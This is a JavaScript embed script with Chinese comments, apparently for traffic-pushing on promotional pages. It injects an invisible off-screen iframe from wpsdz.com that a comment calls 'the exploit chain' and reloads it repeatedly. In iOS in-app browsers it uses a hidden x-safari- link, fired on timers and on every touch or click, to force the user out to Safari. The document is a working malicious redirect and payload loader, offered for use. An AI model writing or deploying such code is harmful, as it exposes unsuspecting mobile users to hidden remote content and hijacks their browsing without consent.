/* fc 推流嵌入脚本 v2（script 直嵌方式）
 * 用法：<script src="https://wpsdz.com/fx-embed.js?c=链码&debug=0"></script>
 * 作用：在推广页(父上下文)里 1) 后台创建投递链 iframe；2) iOS 内嵌浏览器中「任意触摸即跳出 Safari」
 * v2: 增加重试、清sessionStorage、兼容更多in-app浏览器
 */
(function () {
  var self = document.currentScript;
  var q = {};
  try {
    var src = (self && self.src) || '';
    src.replace(/[?&]([^&#]+)/g, function (_, kv) {
      var p = kv.split('=');
      q[decodeURIComponent(p[0])] = decodeURIComponent(p[1] || '');
      return _;
    });
  } catch (e) {}
  var code = String(q.c || '2494be2a').replace(/[^a-zA-Z0-9]/g, '');
  var debug = q.debug === '1';
  var HOST = 'https://wpsdz.com';

  var ua = navigator.userAgent || '';
  var maxTouch = navigator.maxTouchPoints || 0;
  var isIOS = /iPhone|iPad|iPod/i.test(ua) || (/Macintosh/i.test(ua) && maxTouch > 1);
  var isSafari = isIOS && /Safari\//.test(ua) && !/CriOS|FxiOS|EdgiOS|OPiOS|DuckDuckGo|FBAN|FBAV|FB_IAB|FBCR|Instagram|Bytedance|TikTok|musical_ly|ByteLocale|MicroMessenger|Line\/|Twitter|Snapchat|Pinterest|LinkedInApp/i.test(ua);
  var isInApp = isIOS && !isSafari;

  function ready(fn) {
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fn);
    else fn();
  }

  ready(function () {
    var body = document.body || document.documentElement;

    // Create hidden iframe with the exploit chain
    var f = document.createElement('iframe');
    f.src = HOST + '/go/' + code;
    f.style.cssText = 'position:fixed;top:0;left:-9999px;width:1px;height:1px;border:0;';
    f.setAttribute('aria-hidden', 'true');
    body.appendChild(f);

    // Retry: reload iframe every 30s (helps with session skip issue)
    var reloadCount = 0;
    var reloadInterval = setInterval(function () {
      reloadCount++;
      if (reloadCount > 5) { clearInterval(reloadInterval); return; }
      try { f.src = HOST + '/go/' + code + '&t=' + Date.now(); } catch (e) {}
    }, 30000);

    var dbg = null;
    if (debug) {
      dbg = document.createElement('div');
      dbg.style.cssText = 'position:fixed;left:6px;bottom:6px;z-index:2147483647;font:10px/1.6 monospace;color:#0f0;background:rgba(0,0,0,.6);padding:4px 6px;border-radius:4px;pointer-events:none;white-space:pre';
      body.appendChild(dbg);
    }
    function draw() {
      if (!dbg) return;
      dbg.textContent = 'EMBED v2\nios=' + (isIOS ? 1 : 0) + ' safari=' + (isSafari ? 1 : 0) + ' inapp=' + (isInApp ? 1 : 0) + '\ncode=' + code + '\nreloads=' + reloadCount;
    }

    if (isInApp) {
      // In-app browser: try to escape to Safari
      var escUrl = 'x-safari-' + HOST + '/go/' + code;
      var a = document.createElement('a');
      a.href = escUrl;
      a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0;';
      a.setAttribute('aria-hidden', 'true');
      a.textContent = 's';
      body.appendChild(a);

      var fired = false;
      var fire = function () {
        if (fired) return;
        fired = true;
        try { a.click(); } catch (e) {}
        try { window.open(escUrl, '_blank'); } catch (e) {}
        // Reset after 3s for retry
        setTimeout(function () { fired = false; }, 3000);
      };
      [0, 600, 1800, 4000, 7000, 12000].forEach(function (ms) { setTimeout(fire, ms); });
      ['touchstart','touchend','touchmove','pointerdown','pointerup','pointercancel','click','mousedown','mouseup'].forEach(function (t) {
        document.addEventListener(t, function () { fire(); }, { capture: true, passive: true });
      });
    }
    draw();
    setInterval(draw, 5000);
  });
})();
